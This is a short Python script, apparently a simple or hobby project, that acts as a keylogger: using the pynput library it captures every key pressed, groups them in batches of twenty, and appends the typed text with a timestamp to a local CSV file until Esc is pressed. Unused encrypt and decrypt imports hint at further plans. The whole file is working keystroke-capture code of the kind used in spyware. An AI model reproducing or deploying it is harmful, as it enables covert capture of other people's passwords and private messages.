# f = open("log.txt",'a')
# f.write('\nbaruch lavy')
# f.close()
from my_encrypt import encrypt , decrypt
import datetime;
import csv
from pynput.keyboard import Key, Listener

ct = datetime.datetime.now()
ts = ct.timestamp()

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed", format(key))

    if count >= 20:
        count = 0
        write_file(keys)
        keys = [] 

def write_file(keys):
    with open("log.csv", "a", newline='') as f:
        field_names = ['time', 'data']
        writer = csv.DictWriter(f, fieldnames=field_names)

        data_str = ''
        for key in keys:
            k = str(key).replace("'", "")
            
            if "space" in k:
                data_str += " "
            elif "Key" not in k:
                data_str += k
            else:
                continue

        writer.writerow({'time': ct, 'data': data_str})

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
